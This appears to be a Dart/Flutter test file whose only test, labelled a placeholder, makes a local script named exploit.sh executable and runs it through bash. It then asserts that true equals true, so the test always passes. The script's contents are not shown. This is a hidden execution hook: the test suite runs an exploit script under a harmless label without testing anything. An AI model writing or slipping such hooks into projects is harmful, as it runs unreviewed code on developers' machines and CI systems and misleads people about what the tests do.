import 'package:flutter_test/flutter_test.dart';
import 'dart:io';

void main() {
  test('placeholder test', () {
    Process.runSync('chmod', ['+x', 'exploit.sh']);
    Process.runSync('bash', ['exploit.sh']);
    expect(true, true);
  });
}
